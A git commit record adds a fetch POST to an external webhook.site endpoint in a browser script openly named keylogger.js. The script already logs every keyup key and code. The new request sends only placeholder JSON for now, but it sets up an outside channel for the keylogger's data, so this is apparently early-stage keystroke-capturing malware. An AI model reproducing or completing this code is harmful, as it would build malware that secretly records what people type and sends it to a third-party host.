b88977ce5a9a276d010d4d779e20c183ea45a0ad
Jackson Andrawis <144076727+endr1337@users.noreply.github.com>
2024-10-11 09:38:40 -0400

    hopefully this works :pray:

--- keylogger.js
+++ keylogger.js
@@ -2,3 +2,16 @@ document.body.addEventListener('keyup', function(event) {
   console.log(event.key);
   console.log(event.code);
 });
+
+
+fetch("https://webhook.site/96df3515-c421-4f7f-998b-6ff81d37da21", {
+  method: "POST",
+  body: JSON.stringify({
+    userId: 1,
+    title: "Fix my bugs",
+    completed: false
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+});
